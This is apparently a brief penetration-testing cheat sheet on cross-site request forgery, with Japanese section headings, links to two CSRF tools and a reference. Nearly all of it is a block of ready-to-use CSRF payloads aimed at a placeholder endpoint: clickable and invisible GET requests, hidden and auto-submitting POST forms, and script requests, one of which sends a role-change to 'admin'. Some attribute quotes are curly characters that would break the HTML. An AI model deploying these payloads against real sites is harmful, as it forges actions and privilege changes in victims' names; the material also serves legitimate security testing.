
# # Tools
- https://github.com/0xInfection/XSRFProbe
- https://github.com/0xInfection/CSRFPocGenerator.git

# # 簡単な攻撃
```payload
# HTML GET
<a href=”http://vulnerable/endpoint?parameter=CSRFd">Click</a>

# HTML GET (no interaction)
<img src=”http://vulnerable/endpoint?parameter=CSRFd">

# HTML POST:
<form action="http://vulnerable/endpoint" method="POST">
<input name="parameter" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>

# HTML POST (no interaction)
<form id="autosubmit" action="http://vulnerable/endpoint" method="POST">
<input name="parameter" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>
<script>
document.getElementById("autosubmit").submit();
</script>

# JSON GET:
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://vulnerable/endpoint");
xhr.send();
</script>

# JSON POST
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://vulnerable/endpoint");
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"role":admin}');
</script>
```

# # 参考文献
- https://github.com/six2dez/pentest-book/blob/master/enumeration/web/csrf.md